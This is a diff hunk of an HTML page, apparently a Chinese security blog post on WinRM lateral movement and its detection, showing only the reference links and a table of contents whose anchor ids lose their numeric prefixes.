 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://en.wikipedia.org/wiki/Windows_Remote_Management" target="_blank" rel="noopener">Windows Remote Management</a><br><a href="https://redcanary.com/blog/lateral-movement-winrm-wmi" target="_blank" rel="noopener">Lateral Movement Using WinRM and WMI</a><br><a href="https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm" target="_blank" rel="noopener">Demystifying WinRM</a><br><a href="https://devops-collective-inc.gitbook.io/secrets-of-powershell-remoting/remoting-basics" target="_blank" rel="noopener">Secrets of PowerShell Remoting</a><br><a href="https://attack.mitre.org/techniques/T1028/" target="_blank" rel="noopener">Windows Remote Management(ATT&amp;CK)</a></p>
 <p><strong>* 转载请注明作者及来源</strong></p>
@@ -316,7 +317,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WS-Management协议及WinRM"><span class="toc-number">1.</span> <span class="toc-text">WS-Management协议及WinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网横移中的WinRM"><span class="toc-number">2.</span> <span class="toc-text">内网横移中的WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-通过WinRM直接进行横向移动"><span class="toc-number">2.1.</span> <span class="toc-text">1.通过WinRM直接进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-通过WinRM间接进行横向移动"><span class="toc-number">2.2.</span> <span class="toc-text">2.通过WinRM间接进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM活动的捕获及检测"><span class="toc-number">3.</span> <span class="toc-text">WinRM活动的捕获及检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-通过Windows日志检测WinRM活动"><span class="toc-number">3.1.</span> <span class="toc-text">1.通过Windows日志检测WinRM活动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-通过网络流量检测WinRM活动"><span class="toc-number">3.2.</span> <span class="toc-text">2.通过网络流量检测WinRM活动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WS-Management协议及WinRM"><span class="toc-number">1.</span> <span class="toc-text">WS-Management协议及WinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网横移中的WinRM"><span class="toc-number">2.</span> <span class="toc-text">内网横移中的WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过WinRM直接进行横向移动"><span class="toc-number">2.1.</span> <span class="toc-text">通过WinRM直接进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过WinRM间接进行横向移动"><span class="toc-number">2.2.</span> <span class="toc-text">通过WinRM间接进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM活动的捕获及检测"><span class="toc-number">3.</span> <span class="toc-text">WinRM活动的捕获及检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过Windows日志检测WinRM活动"><span class="toc-number">3.1.</span> <span class="toc-text">通过Windows日志检测WinRM活动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过网络流量检测WinRM活动"><span class="toc-number">3.2.</span> <span class="toc-text">通过网络流量检测WinRM活动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
